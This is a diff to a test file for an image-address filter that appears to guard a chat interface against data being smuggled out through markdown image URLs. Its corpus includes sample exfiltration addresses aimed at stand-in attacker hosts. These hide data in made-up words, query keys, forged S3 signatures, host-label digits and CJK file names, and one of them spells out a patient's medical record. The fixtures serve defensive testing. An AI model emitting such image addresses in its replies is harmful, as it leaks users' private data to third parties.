@@ -1,9 +1,13 @@
 import { describe, expect, test } from "bun:test";
 
+import { REPLY_BIT_BUDGET } from "./imageAddressBits";
+import { heldImages } from "./imageBudget";
 import { imageUrlVerdict } from "./imageUrlFilter";
 
 // A corpus for the image address filter: ordinary image addresses in the shapes real CDNs use, which must load without
-// asking, and addresses shaped to carry data out, which must ask. The test prints both error counts.
+// asking, and addresses shaped to carry data out, which must ask. The test prints both error counts. After the addresses
+// come whole replies: ordinary ones, where no image may wait, and ones that spread data over many addresses that each
+// load on their own, where what loads silently must stay within the reply's budget.
 
 const b64 = (text: string) => btoa(text);
 const b64url = (text: string) => b64(text).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
@@ -28,6 +32,9 @@ const BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
 const base62 = (length: number, seed: number) => noise(length, seed).map((byte) => BASE62[byte % 62]).join("");
 /** Random CJK ideographs: about 14 bits each. */
 const cjk = (length: number, seed: number) => noise(length * 2, seed).reduce((text, byte, i, bytes) => (i % 2 ? text + String.fromCharCode(0x4e00 + ((bytes[i - 1]! << 8) | byte) % 0x5000) : text), "");
+const LOWER = "abcdefghijklmnopqrstuvwxyz";
+/** Made-up lower-case words, `size` letters each: log2(26) = 4.7 bits a letter. */
+const madeUpWords = (count: number, size: number, seed: number) => chunks(noise(count * size, seed).map((byte) => LOWER[byte % 26]).join(""), size);
 
 const UUID_A = "4f8a2c1d-7b3e-4a6f-9c2d-1e5f8a7b3c4d";
 const UUID_B = "9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d";
@@ -553,6 +560,19 @@ const MUST_ASK: Record<string, string[]> = {
     `https://e.example/a.png?d=${noise(64, 133).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16)}`).join("")}`,
     "https://e.example/photos/Annual%2520report%2520draft%2520do%2520not%2520share.jpg",
   ],
+  // The four channels no sign counted (random letters shaped like words, short query keys, the fields of a forged
+  // signature, digits in host labels). Each character is charged now, so each of these has more room than one address may.
+  "review v6, F4: channels no sign counted": [
+    `https://e.example/${madeUpWords(15, 24, 141).join("-")}.png`,
+    `https://e.example/${madeUpWords(24, 11, 142).join("-")}.png`,
+    `https://e.example/${madeUpWords(13, 11, 143).join("/")}/a.png?${madeUpWords(13, 11, 144).map((word, i) => `${word}=${i % 3}`).join("&")}`,
+    `https://e.example/a.png?${madeUpWords(48, 5, 145).map((word, i) => `${word}=${i % 2}`).join("&")}`,
+    `https://e.example/${madeUpWords(14, 11, 146).join("-")}.png?${SIGV4}&X-Amz-Signature=${noiseHex(32, 147)}`,
+    `https://${chunks(noise(90, 148).map((byte) => byte % 10).join(""), 10).join("-").match(/.{1,54}(?:-|$)/g)!.map((label) => label.replace(/-$/, "")).join(".")}.e.example/a.png`,
+    `https://${madeUpWords(5, 11, 149).join("-")}.${madeUpWords(5, 11, 150).join("-")}.${madeUpWords(5, 11, 151).join("-")}.e.example/${madeUpWords(12, 11, 152).join("-")}.png`,
+    `https://e.example/${encodeURIComponent(cjk(30, 153))}/${madeUpWords(12, 11, 154).join("-")}.png?${SIGV4}&X-Amz-Signature=${noiseHex(32, 155)}`,
+    "https://attacker.example/notes/patient-margaret-okafor-born-1961-march-fourteenth-diagnosed-with-type-two-diabetes-and-early-stage-kidney-disease-prescribed-metformin-and-lisinopril-next-review-in-january-insurance-member-number-ends-four-four-seven-one-home-address-twelve-harbour-lane.png",
+  ],
 };
 
 /** Addresses that must never load and never ask. */
@@ -576,6 +596,8 @@ const MUST_REFUSE: string[] = [
 
 /** Ordinary addresses that ask anyway, on purpose; listed in the PR as the known false positives. */
 const KNOWN_FALSE_POSITIVES: string[] = [
+  // A chart drawn by a chart service from a configuration in the address: the configuration is free text.
+  "https://quickchart.io/chart?c={type:'bar',data:{labels:['Q1','Q2','Q3','Q4'],datasets:[{label:'Users',data:[50,60,70,180]}]}}",
   // An STS session token is about 1 KB of base64 that no grammar bounds.
   `https://my-bucket.s3.amazonaws.com/photo.jpg?${SIGV4.replace("AKIA", "ASIA")}&X-Amz-Security-Token=${encodeURIComponent(noiseB64(300, 101))}&X-Amz-Signature=${noiseHex(32, 102)}`,
   // CloudFront and Google Cloud Storage sign with RSA: a 2048-bit field anyone could fill, so their shape is not exempt.
@@ -641,5 +663,112 @@ describe("image address corpus", () => {
       if (verdict.kind === "ask") expect(verdict.reasons.length).toBeGreaterThan(0);
       for (const reason of verdict.reasons) expect(reason.detail).not.toBe("");
     }
+  });
+});
+
+// Whole replies. The budget (imageBudget.ts) is what bounds data spread over addresses that each load on their own.
+
+const wiki = (name: string) => `https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/${name}.jpg/640px-${name}.jpg`;
+
+/** Ordinary replies: no image may wait. */
+const REPLIES_THAT_LOAD: Record<string, string[]> = {
+  "five Wikimedia thumbnails": ["Golden_Gate_Bridge", "The_Starry_Night", "Mount_Everest_North_Face", "Tokyo_Tower_at_night", "Photosynthesis_diagram"].map(wiki),
+  "one photo from each of five news sites": ["a", "b", "c", "d", "e"].map((name) => `https://www.${name}-times.example/images/2026/11/18/front-page-${name}-lead-photo-1200x800.jpg`),
+  "a README: six badges and four avatars": [
+    "https://img.shields.io/npm/v/react.svg?style=flat",
+    "https://img.shields.io/github/license/facebook/react.svg",
+    "https://img.shields.io/badge/build-passing-brightgreen.svg",
+    "https://github.com/facebook/react/actions/workflows/runtime_build_and_test.yml/badge.svg",
+    "https://codecov.io/gh/facebook/react/branch/main/graph/badge.svg",
+    "https://img.shields.io/badge/PRs-welcome-brightgreen.svg",
+    ...[583231, 9919, 69631, 1342004].map((id) => `https://avatars.githubusercontent.com/u/${id}?v=4&s=64`),
+  ],
+  "a shop: eight product photos from one CDN": ["front", "back", "side", "detail", "packaging", "lifestyle", "scale", "colours"].map(
+    (view) => `https://cdn.shopify.com/s/files/1/0533/2089/files/blue-ceramic-mug-${view}_800x.jpg?v=1700000000`,
+  ),
+  "four Unsplash photos": ["1503023345310-bd7c1de61c7d", "1441974231531-c6227db76b6e", "1470071459604-3b5ec3a7fe05", "1447752875215-b2761acb3c5d"].map(
+    (id) => `https://images.unsplash.com/photo-${id}?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80`,
+  ),
+  "ten YouTube thumbnails": ["dQw4w9WgXcQ", "9bZkp7q19f0", "kJQP7kiw5Fk", "JGwWNGJdvx8", "OPf0YbXqDm0", "fJ9rUzIMcZQ", "RgKAFK5djSk", "hT_nvWreIhg", "CevxZvSJLk8", "YQHsXMglC9A"].map(
+    (id) => `https://i.ytimg.com/vi/${id}/hqdefault.jpg`,
+  ),
+  "three signed S3 images from one bucket": [1, 2, 3].map((n) => `https://my-bucket.s3.us-east-1.amazonaws.com/uploads/2026/photo-${n}.jpg?${SIGV4}&X-Amz-Signature=${noiseHex(32, 160 + n)}`),
+  "four images through a site's image optimiser": ["hero", "team", "office", "product"].map(
+    (name) => `https://www.example.com/_next/image?url=${encodeURIComponent(`https://cdn.example.com/marketing/${name}.png`)}&w=1200&q=75`,
+  ),
+  "five Medium images": ["dmbNkD5D-u45r44go_cf0g", "Xk3p9Qw7Rm2Tz8LbN4cWfY", "Hs1EuGi6Ko5MaXjZt0BqVn", "PlOe7Qm2Rk9TzLp4VbN8cW", "Zt0BqVnCyHs1EuGi6Ko5Ma"].map(
+    (id) => `https://miro.medium.com/v2/resize:fit:1400/1*${id}.png`,
+  ),
+  "twelve emoji from one CDN": ["1f600", "1f601", "1f602", "1f923", "1f603", "1f604", "1f605", "1f606", "1f609", "1f60a", "1f60b", "1f60e"].map(
+    (code) => `https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/${code}.png`,
+  ),
+  "six images of ours": [1, 2, 3, 4, 5, 6].map((n) => `https://node.tinycloud.xyz/kv/photos/trip-${n}.jpg`),
+  "a mixed answer: Wikipedia, a badge, GitHub and a blog": [
+    wiki("Krebs_cycle"),
+    "https://img.shields.io/badge/coverage-98%25-brightgreen.svg",
+    "https://raw.githubusercontent.com/vercel/next.js/canary/docs/public/images/architecture-overview.png",
+    "https://blog.example.org/wp-content/uploads/2026/11/quarterly-results-summary-chart-1024x576.png",
+  ],
+};
+
+interface DataReply {
+  srcs: string[];
+  /** The most each address carries, in bits: characters times log2 of the alphabet they were drawn from. */
+  carries: number;
+}
+const forged = (seed: number) =>
+  `X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA${noise(16, seed).map((byte) => "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[byte % 32]).join("")}%2F20261118%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261118T120000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=${noiseHex(32, seed + 1000)}`;
+const times = <T>(count: number, make: (i: number) => T) => Array.from({ length: count }, (_, i) => make(i));
+
+/** Replies that spread data over addresses that each load on their own: some must wait, and what loads stays in budget. */
+const REPLIES_THAT_HOLD: Record<string, DataReply> = {
+  "thirty file names that are SHA-256 hashes": { srcs: times(30, (i) => `https://evil.example/${noiseHex(32, 200 + i)}.png`), carries: 256 },
+  "a blob cut into forty pieces of 25 characters": { srcs: times(40, (i) => `https://evil.example/img/${base62(25, 300 + i)}.png`), carries: 25 * Math.log2(62) },
+  // Review v6, F5: a budget kept per domain is no budget when subdomains of a hosting service are free.
+  "forty tenants of a free hosting service, a piece in each name and path": {
+    srcs: times(40, (i) => `https://${madeUpWords(1, 12, 400 + i)[0]}.pages.dev/${base62(22, 500 + i)}.png`),
+    carries: 12 * Math.log2(26) + 22 * Math.log2(62),
+  },
+  "forty unrelated domains, a piece in each": { srcs: times(40, (i) => `https://cdn.${madeUpWords(1, 9, 600 + i)[0]}.example/${base62(22, 700 + i)}.png`), carries: 9 * Math.log2(26) + 22 * Math.log2(62) },
+  // Review v6, F5: an image no sign fires on used to be free.
+  "sixty file names of twelve CJK ideographs, each scoring nothing": { srcs: times(60, (i) => `https://evil.example/${encodeURIComponent(cjk(12, 800 + i))}.png`), carries: 12 * Math.log2(0x5000) },
+  "forty file names of six made-up words": { srcs: times(40, (i) => `https://evil.example/${madeUpWords(6, 11, 900 + i).join("-")}.png`), carries: 66 * Math.log2(26) },
+  "twenty forged signatures": { srcs: times(20, (i) => `https://evil.example/a.png?${forged(1000 + i)}`), carries: 256 + 16 * 5 },
+  "two hundred host names with twelve digits": {
+    srcs: times(200, (i) => `https://${chunks(noise(12, 1100 + i).map((byte) => byte % 10).join(""), 4).join("-")}.evil.example/a.png`),
+    carries: 12 * Math.log2(10),
+  },
+  "a hundred and fifty of the smallest addresses, four characters each": { srcs: times(150, (i) => `https://e.io/${base62(4, 1300 + i)}`), carries: 4 * Math.log2(62) },
+  "sixty short query keys": { srcs: times(60, (i) => `https://evil.example/a.png?${madeUpWords(4, 6, 1500 + i).map((word, n) => `${word}=${n}`).join("&")}`), carries: 24 * Math.log2(26) },
+};
+
+describe("image address corpus: whole replies", () => {
+  const ordinary = Object.entries(REPLIES_THAT_LOAD).map(([name, srcs]) => ({ name, srcs, held: heldImages(srcs) }));
+  const data = Object.entries(REPLIES_THAT_HOLD).map(([name, { srcs, carries }]) => {
+    const held = heldImages(srcs);
+    return { name, srcs, held, silent: Math.ceil((srcs.length - held.length) * carries) };
+  });
+
+  console.log(
+    `image reply corpus: ${ordinary.length} ordinary replies (${ordinary.reduce((sum, reply) => sum + reply.srcs.length, 0)} images), ` +
+      `${ordinary.filter((reply) => reply.held.length > 0).length} with an image waiting; ` +
+      `${data.length} replies carrying data (${data.reduce((sum, reply) => sum + reply.srcs.length, 0)} images), ` +
+      `${data.filter((reply) => reply.held.length === 0).length} with nothing waiting, ` +
+      `at most ${Math.max(...data.map((reply) => reply.silent))} bits loaded silently (budget ${REPLY_BIT_BUDGET})\n` +
+      data.map((reply) => `  ${reply.name}: ${reply.srcs.length - reply.held.length} of ${reply.srcs.length} load, carrying at most ${reply.silent} bits`).join("\n"),
+  );
+
+  test("in an ordinary reply every image loads on its own and none waits", () => {
+    expect(ordinary.flatMap((reply) => reply.srcs).filter((src) => imageUrlVerdict(src).kind !== "load").map(describeVerdict)).toEqual([]);
+    expect(ordinary.filter((reply) => reply.held.length > 0).map((reply) => `${reply.name}: ${reply.held.length} of ${reply.srcs.length} wait`)).toEqual([]);
+  });
+
+  test("the data replies are made of addresses that each load on their own: only the budget stands in their way", () => {
+    expect(data.flatMap((reply) => reply.srcs).filter((src) => imageUrlVerdict(src).kind !== "load").map(describeVerdict)).toEqual([]);
+  });
+
+  test("a reply that spreads data over its images is stopped: some wait, and what loads carries no more than the budget", () => {
+    expect(data.filter((reply) => reply.held.length === 0).map((reply) => reply.name)).toEqual([]);
+    expect(data.filter((reply) => reply.silent > REPLY_BIT_BUDGET).map((reply) => `${reply.name}: ${reply.silent} bits`)).toEqual([]);
   });
 });
